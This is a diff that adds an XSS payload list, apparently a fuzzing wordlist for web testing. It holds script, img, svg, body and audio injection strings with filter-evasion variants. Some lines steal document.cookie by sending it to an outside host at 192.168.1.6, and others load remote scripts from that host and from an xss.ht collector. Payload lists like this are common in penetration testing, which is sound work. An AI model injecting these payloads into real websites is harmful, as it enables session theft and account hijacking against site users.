@@ -1,0 +1,33 @@
+<script>alert(1)</script>
+<Script>alert(1)</Script>
+<sCript>alert(document.domain)</sCript>
+<script>alert(123);</script>
+<script>alert("Armour");</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script>new Image().src="http://192.168.1.6/?c="+document.cookie;</script>
+<script>var i=new Image; i.src="http://192.168.1.6/?"+document.cookie;</script>
+<img src="abc" onerror="alert(1)">
+<img src="" onerror="alert(document.cookie)">
+<img src='x' onerror='alert(document.cookie)' />
+<svg/onload=alert(1)>
+<sc<script>ript>alert(1)</sc</script>ript>
+<BODY ONLOAD=alert('1')>
+<marquee onstart=alert(1)></marquee>
+<audio src/onerror=alert(1)>
+<audio src/onerror=prompt(123)>
+<audio src/onerror=confirm(123)>
+<script src="http://192.168.1.6/test.js" ></script>
+<body onload=alert(123) >
+<body onload=confirm(123) >
+<body onload=prompt(123) >
+<iframe src='https://testforiframe.site/'>
+"><iframe src='https://testforiframe.site/'>
+"><script src="https://ee.xss.ht/"></script>
+"><script>alert(document.domain)</script>
+"><script>alert(document.domain + '\n' + "1")</script>
+"><script>alert(document.domain + '\n' + "Name")</script>
+"<img src='x' onerror='alert(10)' />"
+https://brutelogic.com.br/poc.svg
+http://xss.rocks/scriptlet.html
+poc.svg = <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
